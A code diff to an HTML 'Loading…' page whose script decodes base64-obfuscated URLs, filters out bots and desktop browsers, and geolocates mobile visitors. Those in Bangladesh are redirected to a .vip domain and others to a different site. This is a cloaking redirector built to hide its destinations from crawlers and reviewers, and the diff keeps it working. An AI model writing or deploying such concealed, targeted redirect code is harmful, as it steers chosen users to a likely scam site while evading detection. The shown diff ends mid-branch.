@@ -8,34 +8,24 @@
 html,body{
   margin:0;padding:0;width:100%;height:100%;
   display:flex;align-items:center;justify-content:center;
-  font-family:Arial,sans-serif;background:#fff;color:#000;text-align:center
+  font-family:Arial,sans-serif;background:#fff;color:#000;
 }
 </style>
 </head>
 <body>
-<div>
-  <h2>Loading…</h2>
-</div>
+<div><h3>Loading…</h3></div>
 
 <script>
 (function(){
 
-/* ===== STRINGS (ENCODED) ===== */
-var _S = [
-  "aHR0cHM6Ly9xeWxvZi52aXAvYnNybmI=", // Web A
-  "aHR0cHM6Ly9wb2tpLmNvbQ==",         // Web B
-  "aHR0cHM6Ly9pcGFwaS5jby9qc29uLw=="  // API
-];
+/* ===== ENCODED URLS ===== */
+var A = atob("aHR0cHM6Ly9xeWxvZi52aXAvYnNybmI=");
+var B = atob("aHR0cHM6Ly9wb2tpLmNvbQ==");
+var API = atob("aHR0cHM6Ly9pcGFwaS5jby9jb3VudHJ5");
 
-function D(x){ return atob(x); }
-
-var A = D(_S[0]);
-var B = D(_S[1]);
-var API = D(_S[2]);
-
+/* ===== UA CHECK ===== */
 var ua = navigator.userAgent.toLowerCase();
 
-/* ===== HELPERS ===== */
 function isMobile(){
   return /android|iphone|ipad|ipod/.test(ua);
 }
@@ -47,7 +37,7 @@ function isBot(){
 function go(u){
   setTimeout(function(){
     location.replace(u);
-  }, 800 + Math.random()*800);
+  }, 700 + Math.random()*700);
 }
 
 /* ===== MAIN ===== */
@@ -56,10 +46,11 @@ if(isBot() || !isMobile()){
   return;
 }
 
-fetch(API)
-.then(function(r){ return r.json(); })
-.then(function(d){
-  var c = (d.country_code || "").toUpperCase();
+fetch(API,{cache:"no-store"})
+.then(function(r){ return r.text(); })
+.then(function(c){
+  c = (c||"").trim().toUpperCase();
+
   if(c === "BD"){
     go(A);
   }else{
